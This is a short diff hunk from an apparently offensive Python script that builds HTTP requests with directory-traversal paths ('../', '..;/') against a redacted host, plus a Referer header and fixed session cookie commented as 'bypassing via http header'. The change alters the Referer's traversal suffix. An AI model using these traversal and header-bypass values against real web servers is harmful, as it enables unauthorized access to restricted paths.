@@ -9,7 +9,7 @@ from bs4 import BeautifulSoup
 url = 'http://redacted.com/path/../upload/../index.php/..;/x' # directory traversal
 
 heads1 = {
-    'Referer': 'http://redacted.com/path/../upload/../index.php/..;/x',
+    'Referer': 'http://redacted.com/path/../upload/../index.php/..;/;@',
     'Cookie': 'PHPSESSID=AAAAAA'
 } # bypassing via http header
 
